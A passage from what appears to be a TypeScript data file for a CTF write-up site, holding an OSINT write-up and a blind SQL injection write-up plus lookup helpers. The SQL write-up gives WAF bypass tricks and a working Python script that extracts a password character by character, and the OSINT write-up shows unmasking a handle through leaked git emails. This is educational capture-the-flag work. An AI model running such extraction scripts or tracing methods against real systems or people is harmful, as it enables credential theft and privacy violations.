[+] Twitter: https://twitter.com/d4rkph0en1x_cz
[+] Reddit: https://reddit.com/u/d4rkph0en1x_cz</code></pre>

<h3>Step 2 — GitHub Enumeration</h3>
<p>The GitHub profile has a single repository — <code>dotfiles</code>. Checking the commit history reveals an email in an early commit:</p>

<pre><code>$ git log --format='%ae' | sort -u
d4rkph0en1x@protonmail.com
jan.novak1337@gmail.com</code></pre>

<p>Interesting — the hacker accidentally committed with their real email once: <code>jan.novak1337@gmail.com</code>.</p>

<h3>Step 3 — Social Media Correlation</h3>
<p>Googling the Gmail address leads to a personal blog at <code>jannovak-sec.github.io</code>. The blog's "About" page contains a hidden HTML comment:</p>

<pre><code>&lt;!-- flag: CyberHeroes{0s1nt_m4st3r_tr4ck3d_d0wn_8f2a} --&gt;</code></pre>

<h3>Flag</h3>
<pre><code>CyberHeroes{0s1nt_m4st3r_tr4ck3d_d0wn_8f2a}</code></pre>

<h3>Takeaways</h3>
<ul>
  <li>Reusing usernames across platforms makes you traceable — use different handles for different contexts.</li>
  <li>Git commit history is a goldmine for OSINT — always check <code>git log</code> for leaked emails.</li>
  <li>HTML comments are visible to anyone who views the page source.</li>
</ul>
`,
      },
      // 2 — SQL Injection 2.0 (web, medium)
      {
        slug: 'sql-injection-2-0',
        title: 'SQL Injection 2.0',
        category: 'web',
        description:
          'A modern blind SQL injection challenge with WAF bypass. Extract the admin password character by character.',
        content: `
<h2>SQL Injection 2.0 — CyberHeroes CTF 2025</h2>

<p class="lead">The challenge presents a login form. Classic <code>' OR 1=1 --</code> payloads are blocked by a WAF. We need to find a bypass and extract the admin password via blind injection.</p>

<h3>Reconnaissance</h3>
<p>The login form sends a POST request to <code>/api/login</code> with JSON:</p>

<pre><code>{"username": "admin", "password": "test"}</code></pre>

<p>Trying basic SQLi payloads returns <code>403 Forbidden</code> — a WAF is filtering keywords like <code>OR</code>, <code>UNION</code>, <code>SELECT</code>, and comment sequences.</p>

<h3>WAF Bypass</h3>
<p>After fuzzing, we discover the WAF doesn't filter:</p>
<ul>
  <li>Case variations inside inline comments: <code>/*!50000SeLeCt*/</code></li>
  <li>The <code>LIKE</code> keyword (alternative to <code>=</code>)</li>
  <li><code>SUBSTRING()</code> when written as <code>MID()</code></li>
</ul>

<p>Our boolean condition: if the login returns <em>"Invalid password"</em> vs. <em>"Invalid username"</em>, we know the username matched — that's our oracle.</p>

<h3>Blind Extraction Script</h3>

<pre><code class="language-python">import requests
import string

url = "http://challenge.cyberheroes.cz:8080/api/login"
charset = string.ascii_lowercase + string.digits + "_{}"
password = ""

for pos in range(1, 50):
    found = False
    for c in charset:
        payload = f"admin' AND MID(password,{pos},1) LIKE '{c}' AND '1'='1"
        r = requests.post(url, json={
            "username": payload,
            "password": "x"
        })
        if "Invalid password" in r.text:
            password += c
            print(f"[+] Found char {pos}: {c}  ->  {password}")
            found = True
            break
    if not found:
        break

print(f"\\n[*] Extracted password: {password}")
</code></pre>

<h3>Result</h3>
<pre><code>[+] Found char 1: c  ->  c
[+] Found char 2: y  ->  cy
[+] Found char 3: b  ->  cyb
...
[*] Extracted password: CyberHeroes{bl1nd_sql1_w4f_byp4ss_pr0_5d8e}</code></pre>

<p>The "password" column for the admin user actually stores the flag.</p>

<h3>Flag</h3>
<pre><code>CyberHeroes{bl1nd_sql1_w4f_byp4ss_pr0_5d8e}</code></pre>

<h3>Takeaways</h3>
<ul>
  <li>WAFs are speed bumps, not walls — there are always bypass techniques.</li>
  <li>Blind SQLi is slower but just as devastating as union-based injection.</li>
  <li>Use parameterized queries / prepared statements — <strong>never</strong> concatenate user input into SQL.</li>
</ul>
`,
      },
    ],
  },
];

// ---------------------------------------------------------------------------
// Query Helpers
// ---------------------------------------------------------------------------

/** All CTF events, newest first (based on chronological month ordering). */
export function getCTFEvents(): CTFEvent[] {
  const monthOrder: Record<string, number> = {
    January: 1,
    February: 2,
    March: 3,
    April: 4,
    May: 5,
    June: 6,
    July: 7,
    August: 8,
    September: 9,
    October: 10,
    November: 11,
    December: 12,
  };

  return [...ctfEvents].sort((a, b) => {
    const [monthA, yearA] = a.date.split(' ');
    const [monthB, yearB] = b.date.split(' ');

    const yDiff = Number(yearB) - Number(yearA);
    if (yDiff !== 0) return yDiff;

    return (monthOrder[monthB] ?? 0) - (monthOrder[monthA] ?? 0);
  });
}

/** Look up a single CTF event by its slug. */
export function getCTFBySlug(slug: string): CTFEvent | undefined {
  return ctfEvents.find((e) => e.slug === slug);
}

/** Look up a single challenge inside a CTF. */
export function getChallengeBySlug(
  ctfSlug: string,
  challengeSlug: string,
): { ctf: CTFEvent; challenge: Challenge } | undefined {
  const ctf = getCTFBySlug(ctfSlug);
  if (!ctf) return undefined;

  const challenge = ctf.challenges.find((c) => c.slug === challengeSlug);
  if (!challenge) return undefined;

  return { ctf, challenge };
}

/** Flat list of every challenge, annotated with its parent CTF info. */
export function getAllChallenges(): (Challenge & { ctfSlug: string; ctfName: string })[] {
  return getCTFEvents().flatMap((ctf) =>
    ctf.challenges.map((ch) => ({
      ...ch,
      ctfSlug: ctf.slug,
      ctfName: ctf.name,
    })),
  );
}

/** Return the N most recent challenges (from newest CTF first). */
export function getRecentChallenges(count: number) {
  return getAllChallenges().slice(0, count);
}
